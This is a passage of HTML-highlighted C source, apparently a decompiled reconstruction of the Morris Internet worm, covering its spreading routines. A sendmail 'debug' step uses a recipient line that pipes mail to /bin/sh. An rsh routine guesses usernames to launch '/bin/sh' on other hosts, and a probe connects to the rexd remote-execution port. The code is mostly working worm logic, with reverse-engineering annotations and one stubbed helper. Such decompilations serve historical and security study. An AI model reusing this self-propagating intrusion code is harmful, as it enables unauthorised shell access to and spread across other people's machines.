    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* to 422 */</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 1054 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x50bc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'2'</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">bad</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"debug"</span><span class="sc10">));</span><span class="sc0">      </span><span class="sc1">/* "debug" */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x50bc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'2'</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">bad</span><span class="sc10">;</span><span class="sc0">
    
</span><span class="sc9">#define MAIL_FROM "mail from:&lt;/dev/null&gt;\n"
#define MAIL_RCPT "rcpt to:&lt;\"| sed \'1,/^$/d\' | /bin/sh ; exit 0\"&gt;\n"
</span><span class="sc0">    
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc11">MAIL_FROM</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x50bc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'2'</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">bad</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">random</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x00FFFFFF</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">l548</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc11">MAIL_RCPT</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x50bc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'2'</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">bad</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"data\n"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x50bc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'3'</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">bad</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"data\n"</span><span class="sc10">));</span><span class="sc0">
    
    </span><span class="sc11">compile_slave</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">saddr</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"\n.\n"</span><span class="sc10">));</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x50bc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'2'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd_tmp</span><span class="sc10">);</span><span class="sc0">              </span><span class="sc1">/* This isn't set yet!!! */</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">bad</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"quit\n"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x50bc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'2'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd_tmp</span><span class="sc10">);</span><span class="sc0">              </span><span class="sc1">/* This isn't set yet!!! */</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">bad</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">waithit</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">saddr</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">bad</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"quit\n"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">x50bc</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Used only in try_mail() above.  This fills buffer with a line of the respon
se */</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">x50bc</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">)</span><span class="sc0">             </span><span class="sc1">/* x50bc, &lt;permute+1058
&gt; */</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/* socket */</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buffer</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* Fill in exact code later.  It's pretty boring. */</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/* I call this "huristic 1". It tries to breakin using the remote execution
 * service.  It is called from a subroutine of cracksome_1 with information fr
om
 * a user's .forword file.  The two name are the original username and the one
 * in the .forward file.
 */</span><span class="sc0">
</span><span class="sc11">hu1</span><span class="sc10">(</span><span class="sc11">alt_username</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">username2</span><span class="sc10">)</span><span class="sc0">      </span><span class="sc1">/* x5178 */</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">alt_username</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">username2</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">username</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buffer2</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">local</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd_for_sh</span><span class="sc10">;</span><span class="sc0">           </span><span class="sc1">/* 780, 784, 788 */</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">me</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 530 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">flag</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">HST_HOSTTWO</span><span class="sc10">)</span><span class="sc0">           </span><span class="sc1">/* Already tried ??? */</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">hostname</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">getaddrs</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">flag</span><span class="sc0"> </span><span class="sc10">|=</span><span class="sc0"> </span><span class="sc11">HST_HOSTFOUR</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">strncpy</span><span class="sc10">(</span><span class="sc11">username</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">username2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">username</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">username</span><span class="sc10">[</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">username</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">username</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">username</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">alt_username</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">username</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ispunct</span><span class="sc10">(</span><span class="sc11">username</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">username</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc7">' '</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">other_sleep</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">fd_for_sh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">x538e</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">username</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">alt_username</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd_for_sh</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">talk_to_sh</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd_for_sh</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd_for_sh</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd_for_sh</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd_for_sh</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">fd_for_sh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">x538e</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">alt_username</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">alt_username</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd_for_sh</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buffer2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"exec /usr/ucb/rsh %s -l %s \'exec /bin/sh\'\n"</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">hostname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">username</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">fd_for_sh</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">sleep</span><span class="sc10">(</span><span class="sc4">10</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">test_connection</span><span class="sc10">(</span><span class="sc11">fd_for_sh</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd_for_sh</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">25</span><span class="sc10">))</span><span class="sc0">  </span><span class="sc1">/* 508 */</span><span class="sc0">
        </span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">talk_to_sh</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd_for_sh</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd_for_sh</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd_for_sh</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Used in hu1.  Returns a file descriptor. */</span><span class="sc0">
</span><span class="sc1">/* It goes through the six connections in host trying to connect to the
 * remote execution server on each one.
 */</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">x538e</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">name1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">name2</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">name1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">name2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sin</span><span class="sc10">;</span><span class="sc0">         </span><span class="sc1">/* 16 bytes */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">l6</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l7</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">           </span><span class="sc1">/* 552,762 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 754 */</span><span class="sc0">
    </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">bzero</span><span class="sc10">(&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">));</span><span class="sc0">       </span><span class="sc1">/* 16 */</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IPPORT_EXECSERVER</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc1">/* Oh shit, looking for rexd */</span><span class="sc0">
    
    </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">8</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">signal</span><span class="sc10">(</span><span class="sc11">SIGALRM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">justreturn</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc1">/* 1048 */</span><span class="sc0">
    </span><span class="sc1">/* Check out the connection by writing a null */</span><span class="sc0">
